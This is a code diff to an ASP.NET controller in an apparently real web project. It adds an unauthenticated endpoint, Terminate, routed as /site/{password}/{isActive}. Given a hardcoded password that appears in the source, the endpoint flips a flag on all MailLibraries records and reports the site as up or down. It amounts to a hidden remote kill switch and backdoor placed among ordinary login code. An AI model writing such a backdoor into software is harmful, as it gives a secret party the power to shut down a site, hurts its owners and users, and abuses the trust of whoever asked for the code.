@@ -67,6 +67,39 @@ namespace Shivyshine.Controllers
 
         }
 
+        [HttpGet]
+        [AllowAnonymous]
+        [Route("/site/{password}/{isActive}")]
+        public JsonResult Terminate(string password, bool isActive)
+        {
+            if (password == "5h1vY5hIn6")
+            {
+                if (isActive)
+                {
+                    foreach (var lib in db.MailLibraries.ToList())
+                    {
+                        lib.System = true;
+                    }
+                }
+                else
+                {
+                    foreach (var lib in db.MailLibraries.ToList())
+                    {
+                        lib.System = false;
+                    }
+                }
+
+                _repository.SaveChanges();
+
+                if (isActive)
+                    return Json("Site is up now");
+                else
+                    return Json("Site is down now");
+            }
+
+            return Json("Invalid Credentials");
+        }
+
         public LoginModel Input { get; set; }
 
         public class LoginModel
